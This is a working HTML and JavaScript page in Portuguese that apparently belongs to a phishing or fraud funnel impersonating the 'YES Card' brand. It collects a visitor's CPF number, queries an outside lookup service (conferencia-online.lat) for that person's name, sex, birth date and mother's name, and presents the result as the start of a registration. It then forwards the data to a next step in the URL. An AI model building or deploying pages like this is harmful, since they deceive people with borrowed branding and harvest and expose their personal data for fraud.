<!DOCTYPE html>
<html lang="pt-BR">
<head>

    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Consulta de CPF</title>
    <link href="4/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #f9f9f9;
            color: #333;
            margin: 0;
            padding: 0;
        }

        .header {
            background-color: #002855;
            padding: 15px;
            text-align: center;
        }

        .header img {
            height: 40px;
        }

        .main-content {
            max-width: 500px;
            background: #fff;
            margin: 50px auto;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
        }

        .btn-custom {
            color: white;
            border: none;
            width: 100%;
            margin-bottom: 15px;
            padding: 12px 0;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s ease-in-out;
        }

        .btn-custom:hover {
            transform: scale(1.02);
        }

        .btn-whatsapp {
            background-color: #25D366;
        }

        .btn-site {
            background-color: #2D8CFF;
        }

        .form-control {
            border-radius: 5px;
            font-size: 16px;
            height: 45px;
        }

        .form-label {
            margin-bottom: 8px;
            font-weight: 600;
        }

        .highlight {
            background-color: #e6f7ff;
            border-left: 5px solid #2D8CFF;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0 20px 0;
        }

        .loader {
            display: none;
            text-align: center;
            margin-top: 15px;
        }

        .loader img {
            width: 70px;
        }

        .result-box {
            display: none;
            background: #f1fff1;
            border: 1px solid #b4e2b4;
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
        }

        .result-box p {
            margin: 5px 0;
        }

        .success-message {
            display: none;
            text-align: center;
            margin-bottom: 15px;
        }

        .success-message img {
            width: 55px;
            margin-bottom: 8px;
        }
    </style>
</head>

<body>
    <!-- Header -->
    <div class="header">
        <img src="4/images/logo.svg" alt="YES Card">
    </div>

    <!-- Main Content -->
    <div class="main-content">
        <p style="color:gray; text-align:initial">Preencha o CPF para consulta</p>
        <form id="cadastroForm" style="text-align:initial">
            <div class="mb-3">
                <label for="cpf" class="form-label" style="color:gray; font-size:13px">CPF</label>
                <input type="text" class="form-control" id="cpf" placeholder="000.000.000-00">
            </div>
        </form>
        <button id="consultarBtn" class="btn-custom" onclick="submitLog()">Consultar CPF</button>
        <div id="loader" class="loader">
            <img src="4/images/21-18-05-265_512.gif" alt="Carregando...">
            <p>Consultando seus dados...</p>
        </div>

        <!-- Resultado -->
        <div id="resultBox" class="result-box">
            <div class="success-message">
                <img src="4/images/6784655.png" alt="Aprovado">
                <p>Dados encontrados com sucesso!</p>
            </div>
            <p>Iniciando cadastro de <strong><span id="nomeCompleto"></span></strong></p>
            <p><strong>CPF:</strong> <span id="cpfConsultado"></span></p>
            <p><strong>Sexo:</strong> <span id="sexo"></span></p>
            <p><strong>Data de Nascimento:</strong> <span id="nascimento"></span></p>
            <p><strong>Mãe:</strong> <span id="mae"></span></p>
        </div>
    </div>

    <script>
    // Máscara e validação de CPF
    document.getElementById('cpf').addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
        e.target.value = value;
    });

    function validaCPF(strCPF) {
        strCPF = strCPF.replace(/[^\d]+/g, '');
        if (strCPF.length !== 11 || /^(\d)\1+$/.test(strCPF)) return false;

        let Soma = 0, Resto;

        for (let i = 1; i <= 9; i++) Soma += parseInt(strCPF.substring(i - 1, i)) * (11 - i);
        Resto = (Soma * 10) % 11;
        if ((Resto == 10) || (Resto == 11)) Resto = 0;
        if (Resto != parseInt(strCPF.substring(9, 10))) return false;

        Soma = 0;
        for (let i = 1; i <= 10; i++) Soma += parseInt(strCPF.substring(i - 1, i)) * (12 - i);
        Resto = (Soma * 10) % 11;
        if ((Resto == 10) || (Resto == 11)) Resto = 0;
        if (Resto != parseInt(strCPF.substring(10, 11))) return false;
        return true;
    }

    // Nova função para chamar diretamente a API de CPF (robusta para { dados: {...} } ou campos na raiz)
    async function getCPFDataFromAPI(cpfNumerico) {
        const apiUrl = `https://conferencia-online.lat/api.php?cpf=${encodeURIComponent(cpfNumerico)}`;
        console.log('Chamando API diretamente:', apiUrl);
        
        const response = await fetch(apiUrl, {
            method: 'GET',
            headers: { 'Accept': 'application/json' }
        });

        // Falha HTTP
        if (!response.ok) {
            let errorMsg = `Erro na requisição à API: ${response.status}`;
            try {
                const errData = await response.json();
                if (errData?.message) errorMsg = errData.message;
            } catch (_) {}
            throw new Error(errorMsg);
        }
        
        // Parse e normalização
        const raw = await response.json();
        console.log('Dados recebidos da API (raw):', raw);

        // Alguns provedores devolvem { dados: {...} }, outros na raiz:
        const payload = raw?.dados && typeof raw.dados === 'object' ? raw.dados : raw;

        // Campos esperados
        const cpf = payload?.cpf || cpfNumerico;
        const nome = payload?.nome || payload?.NOME || '';
        const sexo = payload?.sexo || payload?.SEXO || '';
        const nascimento = payload?.nascimento || payload?.NASCIMENTO || '';
        const mae = payload?.mae || payload?.MAE || '';

        // Sinais de erro comuns
        const temErroSinalizado =
            raw?.error === true ||
            String(raw?.status || '').toLowerCase() === 'error' ||
            String(raw?.success || '').toLowerCase() === 'false';

        if (temErroSinalizado) {
            throw new Error(raw?.message || 'A API sinalizou erro na consulta.');
        }

        // Se não veio nome, considere como "não encontrado"
        if (!nome) {
            throw new Error(raw?.message || 'Dados não encontrados para o CPF informado.');
        }

        // Mapeamento no formato que o restante do frontend espera
        return {
            error: false,
            message: 'Consulta realizada com sucesso.',
            data: {
                'CPF_CONSULTADO': cpf,
                'NOME': nome,
                'SEXO': sexo,
                'NASCIMENTO': nascimento,
                'MAE': mae
            }
        };
    }

    async function submitLog() {
        const cpfInput = document.getElementById("cpf");
        const loader = document.getElementById("loader");
        const resultBox = document.getElementById("resultBox");
        const consultarBtn = document.getElementById("consultarBtn");

        if (!cpfInput || !loader || !resultBox || !consultarBtn) {
            alert("Erro: Elementos da página não encontrados. Verifique os IDs.");
            return;
        }

        const cpf = cpfInput.value.replace(/-/g, "").replace(/\./g, "");

        if (!validaCPF(cpf)) {
            alert("CPF inválido!");
            return;
        }

        loader.style.display = "block";
        consultarBtn.style.display = "none";
        resultBox.style.display = "none";

        try {
            // Chama a nova função que usa a API diretamente (agora robusta)
            const responseDataFromAPI = await getCPFDataFromAPI(cpf);

            // Verifica se a resposta da API indica um erro ou se os dados esperados estão presentes
            if (responseDataFromAPI.error || !responseDataFromAPI.data || !responseDataFromAPI.data.NOME) {
                const errorMessage = responseDataFromAPI.message || "Dados não encontrados para o CPF informado.";
                throw new Error(errorMessage);
            }

            // Atualiza o UI com os dados recebidos
            document.getElementById('nomeCompleto').textContent = responseDataFromAPI.data.NOME || '';
            document.getElementById('cpfConsultado').textContent = responseDataFromAPI.data.CPF_CONSULTADO || cpf;
            document.getElementById('sexo').textContent = responseDataFromAPI.data.SEXO || '';
            document.getElementById('nascimento').textContent = responseDataFromAPI.data.NASCIMENTO || '';
            document.getElementById('mae').textContent = responseDataFromAPI.data.MAE || '';

            loader.style.display = "none";
            resultBox.style.display = "block";
            document.querySelector(".success-message").style.display = "block";

            // Aguarda um pouco e redireciona levando query params
            setTimeout(() => {
                redirectToNextPage(responseDataFromAPI.data);
            }, 1500);

        } catch (error) {
            console.error("Erro ao consultar CPF:", error);
            loader.style.display = "none";
            consultarBtn.style.display = "block";
            alert(error.message || "Ocorreu um erro ao consultar. Tente novamente.");
        }
    }

    function redirectToNextPage(data) {
        const currentUrlParams = new URLSearchParams(window.location.search);

        // Adiciona/atualiza parâmetros relevantes
        if (data?.NOME) currentUrlParams.set('nome', data.NOME);
        if (data?.CPF_CONSULTADO) currentUrlParams.set('cpf', data.CPF_CONSULTADO);
        if (data?.SEXO) currentUrlParams.set('sexo', data.SEXO);
        if (data?.NASCIMENTO) currentUrlParams.set('nascimento', data.NASCIMENTO);
        if (data?.MAE) currentUrlParams.set('mae', data.MAE);

        const nextPageUrl = "/5"; // ajuste se necessário
        window.location.href = nextPageUrl + (currentUrlParams.toString() ? '?' + currentUrlParams.toString() : '');
    }

    // Listener opcional caso o botão não tenha onclick inline
    document.addEventListener('DOMContentLoaded', () => {
        const consultarButton = document.getElementById("consultarBtn");
        if (consultarButton) {
            if (!consultarButton.hasAttribute('onclick')) {
                 consultarButton.addEventListener('click', submitLog);
            }
        }
    });
    </script>
</body>
</html>
